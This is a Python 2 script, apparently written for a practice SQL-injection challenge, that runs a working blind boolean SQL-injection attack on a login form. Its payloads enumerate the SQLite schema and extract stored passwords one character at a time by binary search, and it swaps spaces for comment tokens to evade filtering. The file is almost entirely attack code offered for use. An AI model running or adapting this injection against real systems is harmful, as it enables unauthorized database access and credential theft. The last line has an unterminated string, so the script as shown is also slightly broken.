#!/usr/bin/python  
# -*- coding: utf-8 -*-  
import requests, sys, time  
  
color_s = '\x1b[1;32m'  
color_e = '\x1b[00m'  
result = ""  
  
def sanitize(s, ret=''):  
    s = s.replace(' ','/**/')  
    return s  
  
def do_bsqli(sidx, c):  
    #payload =  r"'or(select substr(group_concat(tbl_name,'/'),{0:d},1) from sqlite_master where type='table')>'{1}'or'1'='"  
    #payload =  r"'or(select substr(group_concat(sql,'/'),{0:d},1) from sqlite_master where tbl_name='users_0x4QM')>'{1}'or'1'='"  
    #payload =  r"'or(select substr(group_concat(name_1QXzP,'/'),{0:d},1) from users_0x4QM)>'{1}"  
    payload =  r"'or(select substr(group_concat(password_IU3hA,'/'),{0:d},1) from users_0x4QM)>'{1}"  
    postdata = {'username':'admin', 'password':sanitize(payload).format(sidx, c).replace("'''", '"\'"').replace('"""', "'\"'")}  
    cookie = {'plack_session':'8869b64bfb9c25d481ad75c6fc826c2b82399abe'}  
  
    while True:  
        time.sleep(0.1)  
        try:  
            r = requests.post('http://sqli.katsudon.org/q3/', data=postdata, cookies=cookie)  
        except:  
            continue # 接続に失敗したらやり直し  
  
        if ("Permission denied, please try again." not in r.text) and ("logged in" not in r.text):  # 接続制限が出たらやり直し  
            continue  
        else:  
            break  
  
    if "logged in" in r.text:  
        return True  
    else:  
        return False  
  
def bsqli_bsearch(sidx):  
    global result  
    low, high = 0, 128  
    while low != high:  
      time.sleep(0.1)  
      mid = (low+high)/2  
      if do_bsqli(sidx, chr(mid)) == True:  
        low = mid + 1  
      else:  
        high = mid  
      sys.stdout.write(chr(mid))  
      sys.stdout.flush()  
    if low == 0:  
      return  
    result += chr(low)  
    return  
  
if __name__ == "__main__":  
    print "[*] start"  
    for sidx in xrange(len(result)+1, 1000):  
      old_result = result  
      bsqli_bsearch(sidx)  
      print "\nresult : '"+ color_s + result + color_e + "'"  
  
      if result == old_result:  
        break  
  
    print "[*] finish! -- final string : '" + color_s + result + color_e + "'